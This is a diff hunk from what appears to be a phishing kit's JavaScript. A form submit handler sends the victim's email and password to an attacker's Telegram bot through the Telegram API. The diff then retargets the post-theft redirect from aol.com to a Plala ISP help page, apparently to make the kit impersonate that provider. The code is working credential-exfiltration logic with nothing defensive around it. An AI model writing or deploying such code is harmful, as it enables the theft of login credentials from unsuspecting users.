@@ -38,7 +38,7 @@ forma.addEventListener("submit", e =>{
   fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Plalaail=>${email}=${pwd}=--${year}=-${mon}=->${day}`, {
         method: "GET"
     }).then(success => {
-        window.location.replace("https://aol.com");
+        window.location.replace("https://help.plala.or.jp/as/scope3/ispfaq/web/Detail.aspx?id=230");
     }, error => {
     alert('message not sent')
         console.log(error)
